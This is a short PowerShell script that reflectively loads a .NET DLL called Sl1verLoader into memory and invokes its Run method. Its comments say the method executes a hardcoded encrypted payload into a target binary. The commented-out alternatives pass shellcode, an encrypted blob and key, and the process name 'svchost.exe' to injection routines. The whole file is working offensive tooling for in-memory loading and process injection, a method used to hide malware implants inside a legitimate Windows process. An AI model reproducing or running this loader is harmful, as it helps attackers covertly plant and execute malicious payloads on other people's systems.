# loadme.ps1 - invoke Sl1verLoader.dll via reflection
# Adjust the path to your DLL as needed.

$bytes = [System.IO.File]::ReadAllBytes('C:\Users\dev\source\repos\Sl1verLoader\Sl1verLoaderD\bin\Release\Sl1verLoader.dll')
$asm   = [System.Reflection.Assembly]::Load($bytes)
$type  = $asm.GetType('Sl1verLoader.Program')

# --- Option 1 (recommended) -------------------------------------------
# Run() has no overloads, so GetMethod(name) resolves unambiguously.
# Executes the hardcoded encrypted payload into Payload.TargetBinary.
$type.GetMethod('Run').Invoke($null, $null)

# --- Option 2: parameterless Execute overload --------------------------
# MUST pass an explicit [Type[]] - otherwise GetMethod('Execute') is
# ambiguous because Execute has 4 overloads and throws
# "Ambiguous match found for 'Sl1verLoader.Program Void Execute()'".
# $type.GetMethod('Execute', [Type[]]@()).Invoke($null, $null)

# --- Option 3: other Execute overloads ---------------------------------
# $type.GetMethod('Execute', [Type[]]@([string])).Invoke($null, @('svchost.exe'))
# $type.GetMethod('Execute', [Type[]]@([byte[]], [string])).Invoke($null, @($sc, 'svchost.exe'))
# $type.GetMethod('Execute', [Type[]]@([byte[]], [byte[]], [string], [string])).Invoke($null, @($blob, $key, 'deflate9', 'svchost.exe'))